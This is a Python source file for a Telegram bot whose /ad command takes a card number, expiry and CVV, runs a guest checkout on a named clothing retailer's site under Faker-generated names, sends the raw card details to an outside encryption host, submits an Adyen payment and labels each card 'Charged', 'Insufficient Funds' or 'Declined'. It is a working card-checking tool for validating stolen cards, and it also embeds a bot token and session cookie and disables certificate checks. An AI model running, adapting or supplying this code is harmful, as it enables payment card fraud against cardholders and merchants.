from aiogram import types, Bot, Dispatcher
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import aiohttp
import datetime
import string
import random
import json
from config import auth_chats, API_TOKEN, can_use_b3
from faker import Faker
import re
import ssl

bot = Bot(token="7830034663:AAHcEFO9dHuQRPdRx93sKwYt2TzWGBvev70")
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())
message: types.Message

async def handle_admass_command(chat_id: int, user_id: int, cc: str, mes: str, ano: str, cvv: str):
    start_time = datetime.datetime.now()

    if chat_id in auth_chats['private'] or chat_id in auth_chats['group']:
        if not await can_use_b3(chat_id, user_id):
            return "Please wait 30 seconds before using /ad again.", None

        # التحقق من المعلومات
        if not all([cc, mes, ano, cvv]):
            return "Missing required information.", None

        if len(cc) == 16 and len(cvv) == 3 and mes.isdigit() and ano.isdigit() and len(ano) == 4:
            email = generate_random_email(domain='gmail.com')
            # إرسال البطاقة للفحص
            response_message= await req1(email, chat_id, user_id, cc, mes, ano, cvv, start_time)
            if response_message:
                return response_message
            else:
                return "حدث خطأ أثناء معالجة الطلب."

def generate_random_email(domain='example.com', length=10):
    characters = string.ascii_letters + string.digits
    random_part = ''.join(random.choice(characters) for i in range(length))
    return f"{random_part}@{domain}"

async def req1(email, chat_id, user_id, cc, mes, ano, cvv, start_time):
    url = "https://www.hawesandcurtis.com/api/Checkout/Welcome"
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.5',
    'access-control-allow-origin': '*',
    'content-type': 'application/json',
    'cookie': 'HCSESSION=SessionId=4DCE0FBDEC93569CB807461E8F69277EB48DA636A5B8F0B207A7CD551E43E1EFFA6AB1BDF4D825D743B46C19E283354526B05B901712C90DBC20E03DD18C57CFB56C67C96764D331C2A0ADC04BD758566D618375',
    'dnt': '1',
    'origin': 'https://www.hawesandcurtis.com',
    'referer': 'https://www.hawesandcurtis.com/checkout/welcome',
    'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }
    data = {
        'GuestEmailAddress': email,
        'CheckoutAsGuest': True
    }
    
    # print(data)
    
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
        async with session.post(url, json=data, headers=headers) as response:
            response_text = await response.text()
            # print(response_text)
            return await req2(chat_id, user_id, cc, mes, ano, cvv, start_time, session)
            

async def req2(chat_id, user_id, cc, mes, ano, cvv, start_time, session):
    fake = Faker('en_US')
    random_phone_number = fake.phone_number()
    random_first_name = fake.first_name()
    random_last_name = fake.last_name()
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.hawesandcurtis.com',
        'referer': 'https://www.hawesandcurtis.com/checkout/delivery',
        'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    json_data = {
        'firstName': random_first_name,
        'lastName': random_last_name,
        'title': 'Mr',
        'phoneNumber': random_phone_number,
        'phoneCountryId': 125,
        'country': 'United States',
        'countryCode': 'GB',
        'addAsAGift': False,
        'addressLine1': '10014 State Route 4',
        'addressLine2': '',
        'townCity': 'Whitehall',
        'stateCode': 'NY',
        'countryId': 125,
        'postZipCode': '12887-3648',
        'county': 'New York',
        'selectedShippingId': 43,
    }
    async with session.post('https://www.hawesandcurtis.com/api/Checkout/deliverydetailsave', json=json_data, headers=headers) as response:
        response_text = await response.text()

        return await req3(chat_id, user_id, cc, mes, ano, cvv, start_time, session)
        
async def req3(chat_id, user_id, cc, mes, ano, cvv, start_time, session):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.hawesandcurtis.com',
        'referer': 'https://www.hawesandcurtis.com/checkout/payment',
        'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    json_data = {
         'CardTypeSelected': 'card',
        'IsClickAndCollect': False,
        'IsGuest': True,
        'IsGift': False,
        'HasAddressesBookEntries': False,
        'PaymentTypeSelected': 21,
        'AddressDetailId': 7039904,
        'PhoneNumber': '4349729818',
        'PostCodeAnywhereSecurityKey': 'yx74-rj29-kw49-zw88',
        'PostZipCode': '12887-3648',
        'PrePaidEnabled': False,
        'SagePayEnableTokenisation': False,
        'SagePayPaymentTokenId': None,
        'SagePayPaymentTokens': [],
        'SaveSagePayPaymentToken': False,
        'AddressOption': 'SameAsDelivery',
        'County': None,
    }

    # print(json_data)
    
    # cookies_before = session.cookie_jar.filter_cookies('https://www.hawesandcurtis.com/api/Checkout/Payment')
    
    # print("Cookies before request3:", cookies_before)
    async with session.post('https://www.hawesandcurtis.com/api/Checkout/Payment', json=json_data, headers=headers) as response:
        # cookies_after = session.cookie_jar.filter_cookies('https://www.hawesandcurtis.com/api/Checkout/Payment')
        # print("Cookies after request3:", cookies_after)
        
        response_text = await response.text()
        # await bot.edit_message_text(text="REQ3 DONE", chat_id=chat_id, message_id=message_id_to_edit)      
        return await req4( chat_id, user_id, cc, mes, ano, cvv, start_time, session)  
        
async def req4(chat_id, user_id, cc, mes, ano, cvv, start_time, session):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://scbphil.com/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
}
    async with session.get(f'https://asianprozyy.us/encrypt/adyen?card={cc}|{mes}|{ano}|{cvv}&adyenKey=10001|8E7E762E9CB6B94A3EE01C8ECE2A50BCFF61AFD1B61D64105CCDCAFDD582DBFB2469987269E50A072F3E16DF3FDECC66B0290764503FDB1B302C62BB29D893B069BE6CF5D4905383E9F09BC7E66348CC18582A3C762304E5FE2DA0CDE697B831A1E35E5D31063EB16AD1822FE244609BFD655FF9F46674AAC7DBC7825AC5B685FEA78AFCDA5668E9C8C06972F61EF88D34BFC173EE9DBFA97277A4F139B2627750C350D599083C1B034DDD17B7AFA213697EA396E987FA62C185833E6836FB017393ECD2BE123357C934E519B1F6C003793014B080D64B19F669140A4C295877B7B42450A3204527F889D75F2C9E1270EED37D496B94A7C114F9527361C69601&version=25',  headers=headers) as response:
        response_text = await response.text()
        data = json.loads(response_text)
        cc1 = data.get('encryptedCardNumber', '')
        mes1 = data.get('encryptedExpiryMonth', '')
        ano1 = data.get('encryptedExpiryYear', '')
        cvv1 = data.get('encryptedSecurityCode', '')

        # print(f'Encrypted Card Number: {cc1}')
        # print(f'Encrypted Expiry Month: {mes1}')
        # print(f'Encrypted Expiry Year: {ano1}')
        # print(f'Encrypted Security Code: {cvv1}')
        # print(response_text)
        # await bot.edit_message_text(text="REQ4 DONE", chat_id=chat_id, message_id=message_id_to_edit)
        return await req5(chat_id, user_id, cc, mes, ano, cvv, start_time, session, cc1, mes1, ano1, cvv1)
        
async def req5(chat_id, user_id, cc, mes, ano, cvv, start_time, session, cc1, mes1, ano1, cvv1):
    fake = Faker()
    random_name = fake.name()
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.hawesandcurtis.com',
        'referer': 'https://www.hawesandcurtis.com/checkout/payment',
        'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
}
    json_data = {
        'EncryptedCardNumber': cc1,
        'EncryptedExpiryMonth': mes1,
        'EncryptedExpiryYear': ano1,
        'EncryptedSecurityCode': cvv1,
        'BrowserInfoJson': '{"acceptHeader":"*/*","colorDepth":24,"language":"en-US","javaEnabled":false,"screenHeight":926,"screenWidth":1273,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","timeZoneOffset":-180}',
        'HolderName': random_name,
        'isGift': False,
        'Type': 'scheme',
        'Origin': 'https://www.hawesandcurtis.com',
        }
    # print(json_data)
    
    # cookies_before = session.cookie_jar.filter_cookies('https://www.hawesandcurtis.com/api/Adyen/ProcessPayment')
    
    # print("Cookies before request5:", cookies_before)
    
    async def fetch_bin_details(session, cc):
        url = "https://api.voidex.dev/api/bin"
        params = {"bin": cc[:6]}
        async with session.get(url, params=params) as response:
            if response.status == 200:
                data = await response.json()
                return data
            else:
                print("Failed to retrieve bin details")
                return None

    
    bin_details = await fetch_bin_details(session, cc[:6])
    if bin_details:
        # print(bin_details)
        country_name = bin_details.get('country_name', 'Unknown')
        country_flag = bin_details.get('country_flag', 'Unknown')
        bank = bin_details.get('bank', 'Unknown')
        level = bin_details.get('level', 'Unknown')
        type_ = bin_details.get('type', 'Unknown')
        brand = bin_details.get('brand', 'Unknown')

        
    
    
    async with session.post('https://www.hawesandcurtis.com/api/Adyen/ProcessPayment', json=json_data, headers=headers) as response:
        end_time = datetime.datetime.now()
        duration = end_time - start_time

        if response.status == 200:
            response_text = await response.text()

            try:
                response_data = json.loads(response_text)

                if 'result' in response_data:
                    # يتم التحقق من أن 'result' يحتوي على 'JsonResponse'
                    result = response_data['result']
                    json_response_data = json.loads(result.get('JsonResponse', '{}'))

                    refusal_reason_general = result.get("RefusalReason", "Unknown")
                    refusal_reason_raw = json_response_data.get("additionalData", {}).get("refusalReasonRaw", "Unknown")

                    if refusal_reason_general == "Payment declined, please contact customer services":
                        detailed_refusal_reason = re.sub(r"\d+\s*:\s*", "", refusal_reason_raw)
                    else:
                        detailed_refusal_reason = refusal_reason_general

                    authorisedOrReceived = json_response_data.get("AuthorisedOrReceived", "Unknown")
                    avsResult = json_response_data.get("additionalData", {}).get("avsResult", "Unknown")
                    fraudResultType = json_response_data.get("additionalData", {}).get("fraudResultType", "Unknown")
                    cvcResult = json_response_data.get("additionalData", {}).get("cvcResult", "Unknown")
                    fraudResultSeverity = "High" if fraudResultType == "RED" else "Low" if fraudResultType == "GREEN" else "Unknown"
                else:
                    print("No 'result' key in response_data")

            except json.JSONDecodeError:
                print("Response text is not valid JSON")
        else:
            print(f"HTTP error occurred with status code: {response.status}")

            
    if ('Approved' in response_text or 'completed successfully' in response_text or 
        (response_data.get('success') and response_data['result'].get('AuthorisedOrReceived') == True and response_data['result'].get('ResultCode') == "Authorised")):
        response_status = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅"

    elif 'Not enough balance' in response_text or (json_response_data.get('resultCode') == "Refused" and "Insufficient funds/over credit limit" in json_response_data.get('refusalReasonRaw', "").lower()):
        response_status = "𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ✅"

    elif ('CVC Declined' in response_text or 'Decline for CVV2 failure' in response_text or 
        (json_response_data.get('resultCode') == "Refused" and "CVC" in json_response_data.get('refusalReasonRaw', ""))):
        response_status = "𝐂𝐂𝐍♻️"

    elif 'Exceeds withdrawal amount limit' in response_text:
        response_status = "𝐄𝐱𝐜𝐞𝐞𝐝𝐬 𝐋𝐢𝐦𝐢𝐭 ♻️"

    else:
        refusal_reason = json_response_data.get('refusalReasonRaw', "Unknown reason")
        response_status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌"

    if 'RedirectShopper' in response_text or 'paymentData' in response_text or (json_response_data.get('resultCode') == "RedirectShopper"):
        response_status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 3D ❌"
        detailed_refusal_reason = "3D Secure Verification Required"
        

    response_message = (
        f"{response_status}\n\n"
        f"𝐂𝐚𝐫𝐝 ⇾ <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Adyen Charge 18$\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {detailed_refusal_reason}\n"
        f"𝐑𝐢𝐬𝐤 ⇾ {fraudResultSeverity}\n\n"
        f"𝐂𝐯𝐯 𝐑𝐞𝐬𝐮𝐥𝐭 ⇾ {cvcResult}\n"
        f"𝐈𝐧𝐟𝐨 ⇾ {brand} - {level} - {type_}\n"
        f"𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {country_flag}\n\n"
        f"𝐓𝐨𝐨𝐤 ⇾ {round(duration.total_seconds(), 2)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
    )
    print(detailed_refusal_reason)
    # print(response_message)
    return response_message